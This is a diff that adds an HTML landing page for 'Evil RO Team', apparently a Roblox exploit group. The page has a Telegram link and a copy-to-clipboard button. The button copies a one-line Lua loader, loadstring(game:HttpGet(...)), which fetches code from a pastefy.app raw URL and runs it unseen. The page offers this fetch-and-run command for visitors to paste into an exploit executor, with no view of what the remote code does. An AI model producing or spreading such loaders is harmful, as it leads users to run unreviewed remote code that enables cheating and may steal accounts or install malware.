@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>E V I L   R O   TEAM</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #0a0e1f;
+      color: #ff0044;
+      font-family: 'Orbitron', sans-serif;
+      min-height: 100vh;
+      background-image: 
+        radial-gradient(circle at 15% 25%, rgba(180,0,40,0.06) 0%, transparent 35%),
+        radial-gradient(circle at 85% 75%, rgba(220,0,60,0.04) 0%, transparent 40%);
+      background-attachment: fixed;
+    }
+
+    .container {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 1.5rem 1rem;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .title-stack {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: clamp(0.9rem, 4vw, 2.2rem);
+      margin: clamp(1rem, 5vw, 3rem) 0 clamp(2rem, 8vw, 5rem);
+    }
+
+    .line {
+      position: relative;
+      display: block;
+      line-height: 1.1;
+      text-transform: uppercase;
+    }
+
+    .line1 {
+      font-size: clamp(3.4rem, 13vw, 10.5rem);
+      font-weight: 900;
+      letter-spacing: clamp(0.35em, 1.8vw, 0.48em);
+    }
+
+    .line2 {
+      font-size: clamp(2.9rem, 11vw, 9rem);
+      font-weight: 900;
+      letter-spacing: clamp(0.45em, 2.2vw, 0.6em);
+    }
+
+    .line3 {
+      font-family: 'Rajdhani', sans-serif;
+      font-size: clamp(2.4rem, 8.5vw, 7.2rem);
+      font-weight: 700;
+      letter-spacing: clamp(0.35em, 1.8vw, 0.5em);
+      opacity: 0.94;
+    }
+
+    .glitch {
+      color: #ff0044;
+      position: relative;
+      display: inline-block;
+    }
+
+    @media (min-width: 768px) {
+      .glitch {
+        animation: glitch-skew 5s infinite alternate-reverse;
+      }
+      .glitch::before,
+      .glitch::after {
+        content: attr(data-text);
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.78;
+      }
+      .glitch::before {
+        left: 2px;
+        text-shadow: -2px 0 #ff3366;
+        clip: rect(0, 9999px, 0, 0);
+        animation: glitch-anim 2.8s infinite linear alternate-reverse;
+      }
+      .glitch::after {
+        left: -2px;
+        text-shadow: 2px 0 #c40038;
+        clip: rect(0, 9999px, 0, 0);
+        animation: glitch-anim2 3.8s infinite linear alternate-reverse;
+      }
+    }
+
+    .telegram-btn {
+      display: inline-block;
+      padding: clamp(0.95rem, 3.5vw, 1.35rem) clamp(2.4rem, 7vw, 4.2rem);
+      font-size: clamp(1.4rem, 5vw, 2.1rem);
+      font-weight: 700;
+      color: #ff1a53;
+      text-decoration: none;
+      border: 3px solid #ff0044;
+      border-radius: 12px;
+      background: rgba(10, 14, 31, 0.48);
+      backdrop-filter: blur(5px);
+      margin: clamp(1.5rem, 6vw, 3.5rem) 0;
+      transition: all 0.28s ease;
+      text-shadow: 0 0 10px currentColor;
+      box-shadow: 0 0 25px rgba(255,0,68,0.45);
+    }
+
+    .telegram-btn:hover {
+      transform: scale(1.05) translateY(-4px);
+      box-shadow: 0 0 55px rgba(255,0,68,0.75);
+      border-color: #ff3366;
+      color: #ff3366;
+    }
+
+    .script-box {
+      background: rgba(5, 8, 20, 0.72);
+      border: 2px solid #990033;
+      border-radius: 12px;
+      padding: clamp(1.2rem, 4vw, 1.9rem);
+      margin: 1rem 0 2.5rem;
+      max-width: 100%;
+      width: 100%;
+      font-family: 'Rajdhani', monospace;
+      font-size: clamp(1.05rem, 3.6vw, 1.28rem);
+      line-height: 1.65;
+      color: #ff4d73;
+      text-align: left;
+      word-break: break-all;
+      box-shadow: inset 0 0 28px rgba(0,0,0,0.5);
+    }
+
+    .copy-btn {
+      padding: clamp(0.85rem, 3.8vw, 1.15rem) clamp(2rem, 7vw, 3.4rem);
+      font-size: clamp(1.15rem, 4.2vw, 1.55rem);
+      font-weight: 600;
+      color: white;
+      background: linear-gradient(90deg, #aa0033, #ff0044, #aa0033);
+      background-size: 200% 100%;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: all 0.3s;
+      box-shadow: 0 0 22px rgba(170,0,50,0.6);
+      animation: bg-slide 7s linear infinite;
+    }
+
+    .copy-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 0 45px rgba(255,0,80,0.8);
+    }
+
+    .copied {
+      background: #00bb44 !important;
+      box-shadow: 0 0 38px rgba(0,200,70,0.75) !important;
+      animation: none !important;
+    }
+
+    footer {
+      margin-top: auto;
+      padding: 2.5rem 0 1.5rem;
+      font-size: clamp(0.95rem, 3vw, 1.1rem);
+      opacity: 0.58;
+      letter-spacing: 0.12em;
+    }
+
+    @keyframes glitch-skew {
+      0%, 100% { transform: skew(0deg); }
+      3%, 7%   { transform: skew(1.4deg); }
+      5%       { transform: skew(-1.4deg); }
+    }
+
+    @keyframes glitch-anim {
+      0%   { clip: rect(30px, 9999px, 60px, 0); }
+      20%  { clip: rect(10px, 9999px, 80px, 0); }
+      40%  { clip: rect(50px, 9999px, 110px, 0); }
+      100% { clip: rect(35px, 9999px, 75px, 0); }
+    }
+
+    @keyframes glitch-anim2 {
+      0%   { clip: rect(70px, 9999px, 130px, 0); }
+      30%  { clip: rect(20px, 9999px, 90px, 0); }
+      60%  { clip: rect(85px, 9999px, 145px, 0); }
+      100% { clip: rect(55px, 9999px, 105px, 0); }
+    }
+
+    @keyframes bg-slide {
+      0%   { background-position: 0% 50%; }
+      100% { background-position: 200% 50%; }
+    }
+
+    @media (max-width: 480px) {
+      .title-stack { gap: 0.8rem; }
+      .line1, .line2, .line3 { letter-spacing: clamp(0.28em, 1.4vw, 0.38em); }
+      .telegram-btn { padding: 0.9rem 2.2rem; font-size: 1.35rem; }
+      .script-box { font-size: 1rem; padding: 1rem; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="title-stack">
+      <h1 class="glitch line line1" data-text="E V I L">E V I L</h1>
+      <h1 class="glitch line line2" data-text="R O">R O</h1>
+      <div class="line line3">TEAM</div>
+    </div>
+
+    <a href="https://t.me/evilroteam" target="_blank" class="telegram-btn">
+      → JOIN TELEGRAM ←
+    </a>
+
+    <div class="script-box">
+      loadstring(game:HttpGet("https://pastefy.app/pDHyjPGB/raw?part=addon.lua"))()
+    </div>
+
+    <button class="copy-btn" id="copyButton">COPY SCRIPT</button>
+
+    <footer>evil ro team • 2025–2026</footer>
+  </div>
+
+  <script>
+    const copyBtn = document.getElementById('copyButton');
+    const scriptText = `loadstring(game:HttpGet("https://pastefy.app/pDHyjPGB/raw?part=addon.lua"))()`;
+    
+    copyBtn.addEventListener('click', () => {
+      navigator.clipboard.writeText(scriptText).then(() => {
+        copyBtn.textContent = "COPIED ✓";
+        copyBtn.classList.add('copied');
+        setTimeout(() => {
+          copyBtn.textContent = "COPY SCRIPT";
+          copyBtn.classList.remove('copied');
+        }, 2200);
+      }).catch(() => {
+        alert("Couldn't copy — please copy manually");
+      });
+    });
+  </script>
+</body>
+</html>
